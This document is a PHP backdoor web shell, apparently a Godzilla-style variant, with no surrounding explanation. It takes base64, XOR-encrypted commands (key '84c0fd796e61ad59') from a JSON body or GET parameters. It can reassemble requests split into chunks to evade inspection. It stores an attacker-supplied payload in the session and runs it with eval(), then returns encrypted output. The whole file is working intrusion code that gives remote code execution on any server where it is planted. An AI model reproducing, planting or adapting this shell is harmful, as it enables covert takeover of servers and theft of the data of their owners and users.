<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function cp_read_raw() {
    return file_get_contents('php://input');
}
function cp_json_value($raw, $name) {
    if (preg_match('/"' . preg_quote($name, '/') . '"\s*:\s*"([^"]*)"/', $raw, $m)) {
        return stripcslashes($m[1]);
    }
    return null;
}
function cp_apply_get_chunks() {
    if (!isset($_GET['_c'])) { return; }
    @session_start();
    $chunkId = isset($_GET['_k']) ? $_GET['_k'] : '';
    $index = isset($_GET['_i']) ? intval($_GET['_i']) : -1;
    $total = isset($_GET['_n']) ? intval($_GET['_n']) : 0;
    $data = isset($_GET['_d']) ? $_GET['_d'] : '';
    if ($chunkId === '' || $index < 0 || $total <= 0 || $total > 512) { echo ''; exit; }
    $sessionKey = '_p' . md5($chunkId);
    if (!isset($_SESSION[$sessionKey]) || !is_array($_SESSION[$sessionKey])) {
        $_SESSION[$sessionKey] = array('total' => $total, 'parts' => array());
    }
    $_SESSION[$sessionKey]['total'] = $total;
    $_SESSION[$sessionKey]['parts'][$index] = $data;
    if (count($_SESSION[$sessionKey]['parts']) < $total) {
        @session_write_close();
        echo '';
        exit;
    }
    $query = '';
    for ($i = 0; $i < $total; $i++) {
        if (!isset($_SESSION[$sessionKey]['parts'][$i])) {
            @session_write_close();
            echo '';
            exit;
        }
        $query .= $_SESSION[$sessionKey]['parts'][$i];
    }
    unset($_SESSION[$sessionKey]);
    $pairs = array();
    parse_str($query, $pairs);
    foreach ($pairs as $k => $v) {
        $_GET[$k] = $v;
    }
}
cp_apply_get_chunks();
function cp_xor($data, $key) {
    $len = strlen($data);
    $keyLen = strlen($key);
    if ($keyLen == 0) { return $data; }
    for ($i = 0; $i < $len; $i++) {
        $data[$i] = chr(ord($data[$i]) ^ ord($key[$i % $keyLen]));
    }
    return $data;
}
if (!function_exists('encode')) {
    function encode($D, $K = '') {
        $keyLen = strlen($K);
        if ($keyLen == 0) { return $D; }
        for ($i = 0; $i < strlen($D); $i++) {
            $D[$i] = $D[$i] ^ $K[($i + 1) & 15];
        }
        return $D;
    }
}
function cp_gzip_decode($data) {
    if (function_exists('gzdecode')) {
        $out = @gzdecode($data);
        if ($out !== false) { return $out; }
    }
    if (function_exists('gzinflate')) {
        $out = @gzinflate(substr($data, 10, -8));
        if ($out !== false) { return $out; }
    }
    return $data;
}
function cp_gzip_encode($data) {
    if (function_exists('gzencode')) {
        $out = @gzencode($data, 6);
        if ($out !== false) { return $out; }
    }
    return $data;
}
$pass = 'transport';
$key = '84c0fd796e61ad59';
$payloadName = 'payload';
$raw = cp_read_raw();
$wire = cp_json_value($raw, 'data');
if (($wire === null || $wire === '') && isset($_GET['data'])) {
    $wire = $_GET['data'];
}
if ($wire !== null && $wire !== '') {
    $data = base64_decode($wire);
$data = cp_xor($data, $key);
    if (!isset($_SESSION[$payloadName])) {
        $_SESSION[$payloadName] = $data;
        echo '';
    } else {
        $payload = $_SESSION[$payloadName];
        eval($payload);
        $result = @run($data);
$result = cp_xor($result, $key);
echo base64_encode($result);
    }
}
?>
